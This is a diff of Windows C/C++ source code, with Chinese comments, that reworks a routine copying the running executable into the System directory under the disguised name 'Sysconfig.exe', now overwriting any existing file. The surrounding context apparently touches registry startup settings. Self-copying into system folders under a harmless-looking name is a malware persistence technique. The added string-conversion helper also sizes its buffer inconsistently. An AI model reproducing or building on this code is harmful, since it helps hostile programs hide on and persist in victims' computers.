@@ -394,17 +394,36 @@ int ComputerStart(char* pathName)
 	RegCloseKey(hKey);
 }
 
+LPWSTR CharToLPWSTR(const char* szString)
+{
+	int dwLen = strlen(szString) + 1;
+
+	int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);//算出合适的长度
+
+	LPWSTR lpszPath = new WCHAR[dwLen];
+
+	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
+
+	return lpszPath;
+}
+
+
 int copySelf(char* path)
 {
-	char fileName[MAX_PATH];
-	char sysPath[MAX_PATH];
+	TCHAR fileName[MAX_PATH];
+	TCHAR sysPath[MAX_PATH];
+	char filename[MAX_PATH] = { 0 };
+	char syspath[MAX_PATH] = { 0 };
 	//获得该文件的完整路径
-	GetModuleFileName(NULL, (LPWSTR)fileName, sizeof(fileName));
+	GetModuleFileName(NULL, fileName, MAX_PATH);
 	//取得System目录的完整路径名，写入sysPath
-	GetSystemDirectory((LPWSTR)sysPath, sizeof(sysPath));
-	sprintf(path, "%s\\Sysconfig.exe", sysPath);
+	GetSystemDirectory(sysPath, MAX_PATH);
+	TcharToChar(fileName, filename);
+	TcharToChar(sysPath, syspath);
+	sprintf(path, "%s\\Sysconfig.exe", syspath);
+	LPWSTR Path = CharToLPWSTR(path);
 	//将文件复制到系统目录
-	CopyFile((LPWSTR)fileName, (LPWSTR)path, TRUE);
+	CopyFile(fileName, Path, FALSE);
 	return 0;
 }
 
